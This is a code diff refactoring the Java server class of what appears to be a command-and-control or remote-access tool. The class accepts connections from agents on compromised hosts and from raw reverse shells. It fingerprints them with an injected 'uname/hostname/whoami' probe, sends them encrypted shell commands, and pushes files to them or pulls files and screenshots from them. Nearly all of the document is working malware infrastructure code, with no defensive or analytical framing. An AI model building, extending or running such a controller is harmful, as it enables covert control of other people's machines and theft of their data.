@@ -16,8 +16,16 @@ import java.util.concurrent.*;
 
 public abstract class BaseServer {
 
+    protected static final byte[] EndMarker = "<END>".getBytes();
+    protected static final byte[] MetaMarker = "<META>".getBytes();
+    protected static final Gson Gson = new Gson();
+
+    private static final int PeekWindow = 16;
+    private static final long PeekTimeout = 2000;
+
     protected final String Host;
     protected final int Port;
+    protected final ListenerMode Mode;
     protected final ServerConfig Config;
     protected final SymmetricCrypto Crypto;
     protected final SessionManager Sessions;
@@ -25,13 +33,10 @@ public abstract class BaseServer {
     protected final ConcurrentHashMap<Integer, Object> CommandLocks;
     protected volatile boolean Running;
 
-    protected static final byte[] EndMarker = "<END>".getBytes();
-    protected static final byte[] MetaMarker = "<META>".getBytes();
-    protected static final Gson GsonInstance = new Gson();
-
-    public BaseServer(String Host, int Port, ServerConfig Config) {
+    protected BaseServer(String Host, int Port, ListenerMode Mode, ServerConfig Config) {
         this.Host = Host;
         this.Port = Port;
+        this.Mode = Mode;
         this.Config = Config;
         this.Crypto = new SymmetricCrypto();
         this.Sessions = new SessionManager();
@@ -40,7 +45,7 @@ public abstract class BaseServer {
         try {
             this.Crypto.GenerateKey();
         } catch (Exception E) {
-            Logger.ErrorMsg("Failed to generate crypto key: " + E.getMessage());
+            Logger.Error("Crypto key generation failed: " + E.getMessage());
         }
     }
 
@@ -54,164 +59,325 @@ public abstract class BaseServer {
         Events.AddListener(Listener);
     }
 
-    protected Map<String, Object> DoHandshake(Socket ClientSocket) throws Exception {
-        ClientSocket.setSoTimeout(Config.GetConnectionTimeout());
-        OutputStream Out = ClientSocket.getOutputStream();
-        Out.write(Crypto.GetKey());
-        Out.write('\n');
-        Out.flush();
-        Thread.sleep(300);
+    public enum ConnectionType {
+        TOMCAT,
+        RAW,
+        HTTP,
+        UNKNOWN,
+    }
 
+    public static final class DetectionResult {
+
+        public final ConnectionType Type;
+        public final PushbackInputStream Stream;
+        public final byte[] Peeked;
+
+        DetectionResult(ConnectionType T, PushbackInputStream S, byte[] P) {
+            Type = T;
+            Stream = S;
+            Peeked = P;
+        }
+    }
+
+    protected DetectionResult Detect(Socket Sock) throws IOException {
+        Sock.setSoTimeout((int) PeekTimeout);
+        PushbackInputStream PbIn = new PushbackInputStream(Sock.getInputStream(), 512);
+        byte[] Peek = new byte[PeekWindow];
+        int Read = 0;
+        long Dead = System.currentTimeMillis() + PeekTimeout;
+
+        try {
+            while (Read < PeekWindow && System.currentTimeMillis() < Dead) {
+                int B = PbIn.read();
+                if (B == -1) break;
+                Peek[Read++] = (byte) B;
+            }
+        } catch (java.net.SocketTimeoutException Ignored) {} finally {
+            Sock.setSoTimeout(0);
+        }
+
+        if (Read == 0) return new DetectionResult(ConnectionType.UNKNOWN, PbIn, new byte[0]);
+
+        PbIn.unread(Peek, 0, Read);
+        byte[] P = Arrays.copyOf(Peek, Read);
+        String Str = new String(P, "UTF-8").trim();
+
+        ConnectionType Type;
+        if (Str.startsWith("{")) Type = ConnectionType.TOMCAT;
+        else if (
+            Str.startsWith("GET ") || Str.startsWith("POST ") || Str.startsWith("PUT ") || Str.startsWith("HEAD ")
+        ) Type = ConnectionType.HTTP;
+        else Type = ConnectionType.RAW;
+
+        Logger.Verbose(
+            "Detect [" +
+            Sock.getRemoteSocketAddress() +
+            "] → " +
+            Type +
+            " peek=" +
+            Str.substring(0, Math.min(Str.length(), 12))
+        );
+        return new DetectionResult(Type, PbIn, P);
+    }
+
+    protected Map<String, Object> TomcatHandshake(InputStream In, OutputStream Out, int TimeoutMs) throws Exception {
         ByteArrayOutputStream Buf = new ByteArrayOutputStream();
-        InputStream In = ClientSocket.getInputStream();
-        long Deadline = System.currentTimeMillis() + Config.GetConnectionTimeout();
-        while (System.currentTimeMillis() < Deadline) {
+        long Dead = System.currentTimeMillis() + TimeoutMs;
+        int Depth = 0;
+        boolean InStr = false, Esc = false, Started = false;
+
+        while (System.currentTimeMillis() < Dead) {
             if (In.available() > 0) {
                 int B = In.read();
                 if (B == -1) break;
                 Buf.write(B);
-                if (Buf.size() > 2) {
-                    byte[] Raw = Buf.toByteArray();
-                    if (Raw[Raw.length - 1] == '\n' || Raw[Raw.length - 1] == '}') {
-                        String Json = Buf.toString("UTF-8").trim();
-                        if (Json.startsWith("{")) {
-                            try {
-                                Map<String, Object> Info = GsonInstance.fromJson(Json, Map.class);
-                                ClientSocket.setSoTimeout(0);
-                                return Info;
-                            } catch (Exception Ignored) {}
-                        }
+                char Ch = (char) B;
+                if (Esc) {
+                    Esc = false;
+                } else if (Ch == '\\' && InStr) {
+                    Esc = true;
+                } else if (Ch == '"') {
+                    InStr = !InStr;
+                } else if (!InStr) {
+                    if (Ch == '{') {
+                        Depth++;
+                        Started = true;
+                    } else if (Ch == '}') {
+                        Depth--;
                     }
                 }
+                if (Started && Depth == 0) break;
             } else {
-                Thread.sleep(50);
+                Thread.sleep(30);
             }
         }
 
         String Json = Buf.toString("UTF-8").trim();
-        if (Json.startsWith("{")) {
-            Map<String, Object> Info = GsonInstance.fromJson(Json, Map.class);
-            ClientSocket.setSoTimeout(0);
-            return Info;
+        if (!Json.startsWith("{")) {
+            throw new IOException("Expected JSON, got: " + (Json.length() > 64 ? Json.substring(0, 64) + "…" : Json));
         }
-        throw new IOException("Invalid agent info: " + Json);
+
+        @SuppressWarnings("unchecked")
+        Map<String, Object> Info = Gson.fromJson(Json, Map.class);
+        for (String F : new String[] { "os", "hostname", "user" }) {
+            if (!Info.containsKey(F) || Info.get(F) == null) {
+                throw new IOException("Agent JSON missing field: " + F);
+            }
+        }
+
+        Out.write((Crypto.GetKeyAsBase64Url() + "\n").getBytes("UTF-8"));
+        Out.flush();
+        Logger.Verbose("TOMCAT handshake OK — " + Info.get("hostname"));
+        return Info;
     }
 
-    protected void MonitorSession(int SessionId, Socket Sock) {
-        Thread MonitorThread = new Thread(() -> {
-            while (Running) {
-                if (!Sessions.Exists(SessionId)) break;
-                try {
-                    Object Lock = CommandLocks.get(SessionId);
-                    if (Lock != null) {
-                        synchronized (Lock) {}
+    protected Map<String, Object> RawHandshake(InputStream In, OutputStream Out, String RemoteAddr) throws Exception {
+        Map<String, Object> Info = new LinkedHashMap<>();
+        Info.put("os", "Unknown");
+        Info.put("hostname", "Unknown");
+        Info.put("user", "Unknown");
+        Info.put("architecture", "Unknown");
+        Info.put("agentip", RemoteAddr.replaceAll("/|:.*", ""));
+        Info.put("shellmode", "Raw");
+
+        String Probe =
+            "echo TCID:$(uname -s 2>/dev/null || echo WIN):$(hostname 2>/dev/null):" +
+            "$(whoami 2>/dev/null):$(uname -m 2>/dev/null)\n";
+        try {
+            Out.write(Probe.getBytes("UTF-8"));
+            Out.flush();
+            StringBuilder Resp = new StringBuilder();
+            long Dead = System.currentTimeMillis() + 3000;
+            while (System.currentTimeMillis() < Dead) {
+                if (In.available() > 0) {
+                    Resp.append((char) In.read());
+                    int Idx = Resp.indexOf("TCID:");
+                    if (Idx >= 0) {
+                        int End = Resp.indexOf("\n", Idx);
+                        if (End > 0) {
+                            String[] Parts = Resp.substring(Idx + 5, End).trim().split(":", -1);
+                            if (Parts.length >= 4) {
+                                if (!Parts[0].isEmpty()) Info.put("os", Parts[0]);
+                                if (!Parts[1].isEmpty()) Info.put("hostname", Parts[1]);
+                                if (!Parts[2].isEmpty()) Info.put("user", Parts[2]);
+                                if (!Parts[3].isEmpty()) Info.put("architecture", Parts[3]);
+                            }
+                            break;
+                        }
                     }
-                    Sock.getInputStream().available();
-                    int PeekByte = Sock.getInputStream().read();
-                    if (PeekByte == -1) throw new IOException("Agent disconnected");
-                    Thread.sleep(3000);
-                } catch (Exception E) {
-                    Events.Trigger(
-                        EventType.AgentDisconnected,
-                        EventManager.BuildData("ID", SessionId, "Reason", E.getMessage())
-                    );
-                    RemoveSession(SessionId);
-                    break;
+                } else {
+                    Thread.sleep(50);
                 }
             }
-        });
-        MonitorThread.setDaemon(true);
-        MonitorThread.start();
+        } catch (Exception E) {
+            Logger.Warn("Raw probe failed (session still registered): " + E.getMessage());
+        }
+        Logger.Verbose("Raw handshake — host=" + Info.get("hostname") + " os=" + Info.get("os"));
+        return Info;
+    }
+
+    protected void MonitorSession(int SessionId, Socket Sock, boolean IsRaw) {
+        Thread T = new Thread(
+            () -> {
+                while (Running && Sessions.Exists(SessionId)) {
+                    try {
+                        if (Sock.isClosed() || !Sock.isConnected() || Sock.isInputShutdown()) {
+                            throw new IOException("Socket closed");
+                        }
+                        Object Lock = CommandLocks.get(SessionId);
+                        if (Lock != null) {
+                            synchronized (Lock) {}
+                        }
+                        if (!IsRaw) {
+                            try {
+                                byte[] Ping = Crypto.Encrypt("__PING__".getBytes("UTF-8"));
+                                synchronized (Sock) {
+                                    Sock.getOutputStream().write(Ping);
+                                    Sock.getOutputStream().flush();
+                                }
+                            } catch (Exception E) {
+                                throw new IOException("Heartbeat failed: " + E.getMessage());
+                            }
+                        }
+                        Thread.sleep(15_000);
+                    } catch (InterruptedException E) {
+                        Thread.currentThread().interrupt();
+                        break;
+                    } catch (Exception E) {
+                        Logger.Verbose("Session-" + SessionId + " disconnected: " + E.getMessage());
+                        Events.Trigger(
+                            EventType.AgentDisconnected,
+                            EventManager.BuildData("ID", SessionId, "Reason", E.getMessage())
+                        );
+                        RemoveSession(SessionId);
+                        break;
+                    }
+                }
+            },
+            "Monitor-" + SessionId
+        );
+        T.setDaemon(true);
+        T.start();
     }
 
     public String[] ExecuteCommand(int SessionId, String Command) {
-        Optional<Session> OptSession = Sessions.Get(SessionId);
-        if (OptSession.isEmpty()) return new String[] { "false", "Session not found" };
-        Session S = OptSession.get();
-        String CmdLower = Command.trim().toLowerCase();
-        boolean IsUpload = CmdLower.startsWith("upload");
-        boolean IsDownload =
-            CmdLower.startsWith("download") || CmdLower.startsWith("dl ") || CmdLower.startsWith("screenshot");
-        try {
-            if (IsUpload) return HandleUpload(S, Command);
-            byte[] Encrypted = Crypto.Encrypt(Command.getBytes("UTF-8"));
-            S.GetSocket().setSoTimeout(Config.GetCommandTimeout());
-            OutputStream Out = S.GetSocket().getOutputStream();
-            Out.write(Encrypted);
-            Out.flush();
-            if (IsDownload) return HandleDownload(S);
-            byte[] Response = ReadResponse(S.GetSocket(), Config.GetCommandTimeout());
-            if (Response == null) return new String[] { "false", "No response from agent" };
-            String Decrypted = Crypto.DecryptString(Response);
-            return new String[] { "true", Decrypted };
-        } catch (Exception E) {
-            RemoveSession(SessionId);
-            return new String[] { "false", "Error: " + E.getMessage() };
+        Optional<Session> Opt = Sessions.Get(SessionId);
+        if (Opt.isEmpty()) return Fail("Session not found");
+        Session S = Opt.get();
+        Object Lck = CommandLocks.get(SessionId);
+        if (Lck == null) return Fail("Session lock missing");
+
+        synchronized (Lck) {
+            try {
+                String Cmd = Command.trim();
+                if (Cmd.isEmpty()) return Fail("Empty command");
+                String CmdLow = Cmd.toLowerCase();
+
+                if (CmdLow.startsWith("upload")) return HandleUpload(S, Cmd);
+                if (CmdLow.startsWith("download") || CmdLow.startsWith("dl ") || CmdLow.startsWith("screenshot")) {
+                    return S.IsRawMode() ? Fail("Download unsupported in raw mode") : SendThenDownload(S, Cmd);
+                }
+
+                if (S.IsRawMode()) {
+                    synchronized (S.GetSocket()) {
+                        S.GetSocket().getOutputStream().write((Cmd + "\n").getBytes("UTF-8"));
+                        S.GetSocket().getOutputStream().flush();
+                    }
+                } else {
+                    byte[] Enc = Crypto.Encrypt(Cmd.getBytes("UTF-8"));
+                    synchronized (S.GetSocket()) {
+                        S.GetSocket().getOutputStream().write(Enc);
+                        S.GetSocket().getOutputStream().flush();
+                    }
+                }
+
+                byte[] Resp = ReadResponse(S.GetSocket(), Config.GetCommandTimeout());
+                if (Resp == null || Resp.length == 0) return Fail("No response from agent");
+                String Out = S.IsRawMode() ? new String(Resp, "UTF-8") : Crypto.DecryptString(Resp);
+                Logger.Verbose("Session-" + SessionId + " cmd result length=" + Out.length());
+                return new String[] { "true", Out };
+            } catch (Exception E) {
+                Logger.Error("Command error session-" + SessionId + ": " + E.getMessage());
+                RemoveSession(SessionId);
+                return Fail("Error: " + E.getMessage());
+            }
         }
     }
 
     protected byte[] ReadResponse(Socket Sock, int TimeoutMs) throws IOException {
         Sock.setSoTimeout(TimeoutMs);
-        ByteArrayOutputStream Buffer = new ByteArrayOutputStream();
+        ByteArrayOutputStream Buf = new ByteArrayOutputStream();
         byte[] Tmp = new byte[Config.GetBufferSize()];
-        long Start = System.currentTimeMillis();
+        long Dead = System.currentTimeMillis() + TimeoutMs;
         while (true) {
             int N;
             try {
                 N = Sock.getInputStream().read(Tmp);
             } catch (java.net.SocketTimeoutException E) {
-                if (Buffer.size() > 0) break;
-                return null;
+                break;
             }
             if (N == -1) break;
-            Buffer.write(Tmp, 0, N);
-            byte[] Current = Buffer.toByteArray();
-            if (EndsWith(Current, EndMarker)) {
-                return Arrays.copyOf(Current, Current.length - EndMarker.length);
-            }
-            if (System.currentTimeMillis() - Start > TimeoutMs) break;
+            Buf.write(Tmp, 0, N);
+            byte[] Cur = Buf.toByteArray();
+            if (EndsWith(Cur, EndMarker)) return Arrays.copyOf(Cur, Cur.length - EndMarker.length);
+            if (System.currentTimeMillis() > Dead) break;
         }
-        return Buffer.size() > 0 ? Buffer.toByteArray() : null;
+        return Buf.size() > 0 ? Buf.toByteArray() : null;
     }
 
     private String[] HandleUpload(Session S, String Command) {
-        String[] Parts = Command.trim().split("\\s+", 3);
-        if (Parts.length < 2) return new String[] { "false", "Usage: upload <local_path> [remote_path]" };
-        String LocalPath = Parts[1];
-        String RemotePath = Parts.length > 2 ? Parts[2] : "";
-        if (!Files.exists(Paths.get(LocalPath))) return new String[] { "false", "Local file not found: " + LocalPath };
+        if (S.IsRawMode()) return Fail("Upload unsupported in raw mode");
+        String[] Parts = Command.split("\\s+", 3);
+        if (Parts.length < 2) return Fail("Usage: upload <local> [remote]");
+        String Local = Parts[1];
+        String Remote = Parts.length > 2 ? Parts[2] : "";
+        if (!Files.exists(Paths.get(Local))) return Fail("File not found: " + Local);
         try {
-            String Filename = Paths.get(LocalPath).getFileName().toString();
-            String AgentCmd = RemotePath.isEmpty() ? "upload " + Filename : "upload " + RemotePath;
-            byte[] Encrypted = Crypto.Encrypt(AgentCmd.getBytes("UTF-8"));
+            String Name = Paths.get(Local).getFileName().toString();
+            byte[] Enc = Crypto.Encrypt((Remote.isEmpty() ? "upload " + Name : "upload " + Remote).getBytes("UTF-8"));
             OutputStream Out = S.GetSocket().getOutputStream();
-            Out.write(Encrypted);
-            Out.flush();
-            Thread.sleep(300);
-            byte[] FileData = Files.readAllBytes(Paths.get(LocalPath));
-            Map<String, Object> Meta = new HashMap<>();
-            Meta.put("type", "file");
-            Meta.put("filename", Filename);
-            Meta.put("size", FileData.length);
-            byte[] MetaJson = Crypto.Encrypt(GsonInstance.toJson(Meta).getBytes("UTF-8"));
-            Out.write(MetaJson);
-            Out.write(MetaMarker);
-            Out.flush();
-            Thread.sleep(100);
-            Out.write(FileData);
-            Out.write(EndMarker);
-            Out.flush();
-            return new String[] { "true", "File sent: " + Filename + " (" + FileData.length + " bytes)" };
+            synchronized (S.GetSocket()) {
+                Out.write(Enc);
+                Out.flush();
+                Thread.sleep(300);
+                byte[] Data = Files.readAllBytes(Paths.get(Local));
+                Map<String, Object> Meta = new LinkedHashMap<>();
+                Meta.put("type", "file");
+                Meta.put("filename", Name);
+                Meta.put("size", Data.length);
+                byte[] MetaEnc = Crypto.Encrypt(Gson.toJson(Meta).getBytes("UTF-8"));
+                Out.write(MetaEnc);
+                Out.write(MetaMarker);
+                Out.flush();
+                Thread.sleep(100);
+                Out.write(Data);
+                Out.write(EndMarker);
+                Out.flush();
+            }
+            return new String[] { "true", "Uploaded: " + Name };
         } catch (Exception E) {
-            return new String[] { "false", "Upload error: " + E.getMessage() };
+            return Fail("Upload error: " + E.getMessage());
+        }
+    }
+
+    private String[] SendThenDownload(Session S, String Command) {
+        try {
+            byte[] Enc = Crypto.Encrypt(Command.getBytes("UTF-8"));
+            synchronized (S.GetSocket()) {
+                S.GetSocket().getOutputStream().write(Enc);
+                S.GetSocket().getOutputStream().flush();
+            }
+            return HandleDownload(S);
+        } catch (Exception E) {
+            return Fail("Send error: " + E.getMessage());
         }
     }
 
     private String[] HandleDownload(Session S) {
         try {
-            ByteArrayOutputStream Buffer = new ByteArrayOutputStream();
+            ByteArrayOutputStream Buf = new ByteArrayOutputStream();
             byte[] Tmp = new byte[Config.GetBufferSize()];
-            S.GetSocket().setSoTimeout(30000);
+            S.GetSocket().setSoTimeout(30_000);
             while (true) {
                 int N;
                 try {
@@ -220,22 +386,22 @@ public abstract class BaseServer {
                     break;
                 }
                 if (N == -1) break;
-                Buffer.write(Tmp, 0, N);
-                byte[] Current = Buffer.toByteArray();
-                if (ContainsMarker(Current, MetaMarker) || EndsWith(Current, EndMarker)) break;
+                Buf.write(Tmp, 0, N);
+                byte[] Cur = Buf.toByteArray();
+                if (ContainsMarker(Cur, MetaMarker) || EndsWith(Cur, EndMarker)) break;
             }
-            byte[] Data = Buffer.toByteArray();
+            byte[] Data = Buf.toByteArray();
             int MetaIdx = IndexOf(Data, MetaMarker);
             if (MetaIdx >= 0) {
                 byte[] MetaRaw = Arrays.copyOf(Data, MetaIdx);
                 byte[] Rest = Arrays.copyOfRange(Data, MetaIdx + MetaMarker.length, Data.length);
-                String MetaJson = Crypto.DecryptString(MetaRaw);
-                Map<String, Object> Meta = GsonInstance.fromJson(MetaJson, Map.class);
+                @SuppressWarnings("unchecked")
+                Map<String, Object> Meta = Gson.fromJson(Crypto.DecryptString(MetaRaw), Map.class);
                 String Filename = (String) Meta.getOrDefault("filename", "received_file");
-                ByteArrayOutputStream FileBuffer = new ByteArrayOutputStream();
-                FileBuffer.write(Rest);
-                S.GetSocket().setSoTimeout(30000);
-                while (!EndsWith(FileBuffer.toByteArray(), EndMarker)) {
+                ByteArrayOutputStream FileBuf = new ByteArrayOutputStream();
+                FileBuf.write(Rest);
+                S.GetSocket().setSoTimeout(30_000);
+                while (!EndsWith(FileBuf.toByteArray(), EndMarker)) {
                     int N;
                     try {
                         N = S.GetSocket().getInputStream().read(Tmp);
@@ -243,23 +409,20 @@ public abstract class BaseServer {
                         break;
                     }
                     if (N == -1) break;
-                    FileBuffer.write(Tmp, 0, N);
+                    FileBuf.write(Tmp, 0, N);
                 }
-                byte[] FileData = FileBuffer.toByteArray();
+                byte[] FileData = FileBuf.toByteArray();
                 if (EndsWith(FileData, EndMarker)) FileData = Arrays.copyOf(
                     FileData,
                     FileData.length - EndMarker.length
                 );
-                String SavePath = SaveFile(Filename, FileData, S.GetId());
-                return SavePath != null
-                    ? new String[] { "true", "File saved: " + SavePath }
-                    : new String[] { "false", "Failed to save file" };
+                String Saved = SaveFile(Filename, FileData, S.GetId());
+                return Saved != null ? new String[] { "true", "Saved: " + Saved } : Fail("Failed to save file");
             }
             if (EndsWith(Data, EndMarker)) Data = Arrays.copyOf(Data, Data.length - EndMarker.length);
-            String Decrypted = Crypto.DecryptString(Data);
-            return new String[] { "true", Decrypted };
+            return new String[] { "true", Crypto.DecryptString(Data) };
         } catch (Exception E) {
-            return new String[] { "false", "Download error: " + E.getMessage() };
+            return Fail("Download error: " + E.getMessage());
         }
     }
 
@@ -267,8 +430,7 @@ public abstract class BaseServer {
         try {
             Path Dir = Paths.get("Downloads/Session_" + SessionId);
             Files.createDirectories(Dir);
-            String Base = Filename;
-            String Ext = "";
+            String Base = Filename, Ext = "";
             int Dot = Filename.lastIndexOf('.');
             if (Dot > 0) {
                 Base = Filename.substring(0, Dot);
@@ -279,19 +441,19 @@ public abstract class BaseServer {
             Files.write(Target, Data);
             return Target.toString();
         } catch (IOException E) {
-            Logger.ErrorMsg("Failed to save file: " + E.getMessage());
+            Logger.Error("SaveFile failed: " + E.getMessage());
             return null;
         }
-    }
-
-    public String GetKeyBase64() {
-        return java.util.Base64.getEncoder().encodeToString(Crypto.GetKey());
     }
 
     public void RemoveSession(int SessionId) {
         Sessions.Remove(SessionId);
         CommandLocks.remove(SessionId);
         Events.Trigger(EventType.AgentRemoved, EventManager.BuildData("ID", SessionId));
+    }
+
+    public String GetKeyBase64() {
+        return java.util.Base64.getEncoder().encodeToString(Crypto.GetKey());
     }
 
     public SessionManager GetSessions() {
@@ -306,6 +468,10 @@ public abstract class BaseServer {
         return Crypto;
     }
 
+    public ListenerMode GetMode() {
+        return Mode;
+    }
+
     public String GetHost() {
         return Host;
     }
@@ -318,6 +484,10 @@ public abstract class BaseServer {
         return Running;
     }
 
+    protected static String[] Fail(String Msg) {
+        return new String[] { "false", Msg };
+    }
+
     protected boolean EndsWith(byte[] Data, byte[] Suffix) {
         if (Data.length < Suffix.length) return false;
         for (int I = 0; I < Suffix.length; I++) if (Data[Data.length - Suffix.length + I] != Suffix[I]) return false;
@@ -328,9 +498,9 @@ public abstract class BaseServer {
         return IndexOf(Data, Marker) >= 0;
     }
 
-    protected int IndexOf(byte[] Data, byte[] Pattern) {
-        outer: for (int I = 0; I <= Data.length - Pattern.length; I++) {
-            for (int J = 0; J < Pattern.length; J++) if (Data[I + J] != Pattern[J]) continue outer;
+    protected int IndexOf(byte[] Data, byte[] Pat) {
+        outer: for (int I = 0; I <= Data.length - Pat.length; I++) {
+            for (int J = 0; J < Pat.length; J++) if (Data[I + J] != Pat[J]) continue outer;
             return I;
         }
         return -1;
